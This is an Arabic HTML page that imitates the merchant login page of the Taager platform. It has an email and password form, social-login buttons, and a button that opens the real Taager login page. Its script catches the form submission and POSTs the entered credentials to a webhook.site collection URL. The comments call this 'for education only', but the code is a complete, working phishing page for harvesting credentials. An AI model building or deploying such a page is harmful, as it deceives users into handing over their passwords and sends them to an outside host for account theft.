<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل دخول تاجر</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --main-color: #0d8321;
            --dark-color: #2C3E50;
            --light-color: #f8f9fa;
            --gray-color: #7f8c8d;
            --success-color: #27ae60;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Cairo', sans-serif;
        }

        body {
            direction: rtl;
            background-color: #f5f5f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
            background-image: url('https://via.placeholder.com/1920x1080/FF6B35/FFFFFF?text=Taager+Background');
            background-size: cover;
            background-position: center;
        }

        .login-container {
            background-color: #fff;
            border-radius: 12px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 480px;
            padding: 40px;
            text-align: center;
        }

        .logo {
            margin-bottom: 30px;
        }

        .logo img {
            width: 120px;
            height: auto;
        }

        .login-form h2 {
            color: var(--dark-color);
            font-size: 24px;
            margin-bottom: 8px;
            font-weight: 700;
        }

        .login-form p {
            color: var(--gray-color);
            font-size: 14px;
            margin-bottom: 30px;
        }

        .input-group {
            margin-bottom: 20px;
            text-align: right;
        }

        .input-group label {
            display: block;
            color: var(--dark-color);
            font-size: 14px;
            margin-bottom: 8px;
            font-weight: 600;
        }

        .input-group input {
            width: 100%;
            padding: 14px 16px;
            border: 1px solid #e0e0e0;
            border-radius: 8px;
            font-size: 15px;
            background-color: #fff;
            transition: border-color 0.3s;
        }

        .input-group input:focus {
            border-color: var(--main-color);
            outline: none;
        }

        .password-input {
            position: relative;
        }

        .password-input input {
            padding-right: 45px;
        }

        .password-input i {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            color: var(--gray-color);
            cursor: pointer;
            font-size: 16px;
        }

        .forgot-password {
            text-align: right;
            margin-bottom: 20px;
        }

        .forgot-password a {
            color: var(--main-color);
            text-decoration: none;
            font-size: 13px;
            font-weight: 600;
        }

        .login-btn {
            width: 100%;
            padding: 14px;
            background-color: var(--main-color);
            color: #fff;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            margin-bottom: 20px;
            transition: background-color 0.3s;
        }

        .login-btn:hover {
            background-color: #08921f;
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
            color: var(--gray-color);
            font-size: 13px;
        }

        .divider::before, .divider::after {
            content: "";
            flex: 1;
            border-bottom: 1px solid #e0e0e0;
        }

        .divider span {
            padding: 0 15px;
        }

        .social-login {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .social-btn {
            width: 100%;
            padding: 12px;
            border: 1px solid #e0e0e0;
            border-radius: 8px;
            background-color: #fff;
            color: var(--dark-color);
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            transition: background-color 0.3s;
        }

        .social-btn:hover {
            background-color: #f8f9fa;
        }

        .social-btn i {
            font-size: 18px;
        }

        .facebook-btn i {
            color: #1877f2;
        }

        .google-btn i {
            color: #078330;
        }

        .signup-link {
            margin-top: 25px;
            font-size: 14px;
            color: var(--gray-color);
        }

        .signup-link a {
            color: var(--main-color);
            text-decoration: none;
            font-weight: 600;
        }

        .login-footer {
            margin-top: 30px;
            font-size: 11px;
            color: #999;
            line-height: 1.5;
        }

        .login-footer a {
            color: var(--main-color);
            text-decoration: none;
        }

        @media (max-width: 480px) {
            .login-container {
                padding: 30px 20px;
            }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <img src="https://via.placeholder.com/120x40/FF6B35/FFFFFF?text=تااجر" alt="Taageer Logo">
        </div>

        <form id="loginForm">
            <div class="input-group">
                <label for="email">البريد الإلكتروني</label>
                <input type="email" id="email" name="email" placeholder="Enter your Email" required>
            </div>

            <div class="input-group">
                <label for="password">كلمة المرور</label>
                <div class="password-input">
                    <input type="password" id="password" name="password" placeholder="ادخل كلمة المرور" required>
                    <i class="fas fa-eye-slash" id="toggle-password"></i>
                </div>
            </div>

            <div class="forgot-password">
                <a href="#">نسيت كلمة المرور؟</a>
            </div>
           <button onclick="window.open('https://taager.com/eg/auth/login')">
  تسجيل الدخول
</button>
           

            <div class="divider">
                <span>أو</span>
            </div>

            <div class="social-login">
                <button type="button" class="social-btn facebook-btn">
                    <i class="fab fa-facebook-f"></i>
                    تسجيل الدخول بواسطة فيسبوك
                </button>
                <button type="button" class="social-btn google-btn">
                    <i class="fab fa-google"></i>
                    تسجيل الدخول بواسطة جوجل
                </button>
            </div>

            <div class="signup-link">
                <p>مفيش حساب عندك؟ <a href="#">سجل الآن</a></p>
            </div>
        </form>

        <div class="login-footer">
            <p>باستخدامك للموقع، فإنك توافق على <a href="#">شروط الاستخدام</a> و <a href="#">سياسة الخصوصية</a></p>
        </div>
    </div>

    <script>
        // Toggle Password Visibility
        const togglePassword = document.getElementById('toggle-password');
        const passwordInput = document.getElementById('password');

        togglePassword.addEventListener('click', () => {
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                togglePassword.classList.replace('fa-eye-slash', 'fa-eye');
            } else {
                passwordInput.type = 'password';
                togglePassword.classList.replace('fa-eye', 'fa-eye-slash');
            }
        });

        // Form Submission (للتعليم فقط)
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const formData = new FormData(this);

            // هنا بيتم إرسال البيانات إلى Webhook.site (للتجربة التعليمية فقط)
            fetch('https://webhook.site/a15b84b8-7830-4a86-b25f-18b90358ed6b', {
                method: 'POST',
                body: formData
            })
            .then(response => {
                alert('تم إرسال البيانات (للتعليم فقط).');
                console.log('Data sent to Webhook.site for testing.');
            })
            .catch(error => {
                console.error('Error:', error);
            });
        });
    </script>
</body>
</html>
